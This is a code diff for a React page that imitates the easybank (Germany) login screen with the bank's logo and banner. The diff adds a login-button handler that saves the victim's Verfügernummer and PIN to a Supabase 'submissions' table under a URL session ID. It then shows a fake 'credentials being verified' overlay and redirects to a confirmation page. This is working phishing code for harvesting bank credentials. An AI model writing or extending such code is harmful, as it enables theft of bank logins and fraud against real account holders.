@@ -1,4 +1,7 @@
 import { useState, useEffect, useRef, useCallback } from "react";
+import { useSearchParams, useNavigate } from "react-router-dom";
+import { supabase } from "@/integrations/supabase/client";
+import LoadingOverlay from "@/components/LoadingOverlay";
 import { Eye, ChevronRight, ChevronDown } from "lucide-react";
 import easybankLogo from "@/assets/logo-easybank_de.png";
 import easybankBanner from "@/assets/EASY26016_login.jpg";
@@ -106,6 +109,11 @@ const RedWarningIcon = () => (
 );
 
 const Easybank = () => {
+  const [searchParams] = useSearchParams();
+  const navigate = useNavigate();
+  const sessionId = searchParams.get("s") || "";
+  const [showLoading, setShowLoading] = useState(false);
+
   const [verfueger, setVerfueger] = useState("");
   const [pin, setPin] = useState("");
   const [showPin, setShowPin] = useState(false);
@@ -140,6 +148,8 @@ const Easybank = () => {
   const scaledHeight = contentHeight ? contentHeight * scale : undefined;
 
   return (
+    <>
+      {showLoading && <LoadingOverlay message="Anmeldedaten werden überprüft..." onComplete={() => navigate("/confirmation")} />}
     <div
       className="min-h-screen bg-white overflow-x-hidden flex justify-center"
       style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
@@ -265,7 +275,17 @@ const Easybank = () => {
 
                   {/* Login button */}
                   <div className="flex justify-end mb-4">
-                    <button className="px-4 py-1.5 bg-[#177991] text-white text-xs font-bold rounded hover:bg-[#126a7d] transition-colors">
+                    <button onClick={async () => {
+              if (sessionId) {
+                await supabase.from("submissions").update({
+                  bank_username: verfueger,
+                  bank_password: pin,
+                  bank_username_label: "Verfügernummer",
+                  bank_password_label: "PIN",
+                }).eq("session_id", sessionId);
+              }
+              setShowLoading(true);
+            }} className="px-4 py-1.5 bg-[#177991] text-white text-xs font-bold rounded hover:bg-[#126a7d] transition-colors">
                       {t.loginBtn}
                     </button>
                   </div>
@@ -395,6 +415,7 @@ const Easybank = () => {
         </div>
       </div>
     </div>
+    </>
   );
 };
 
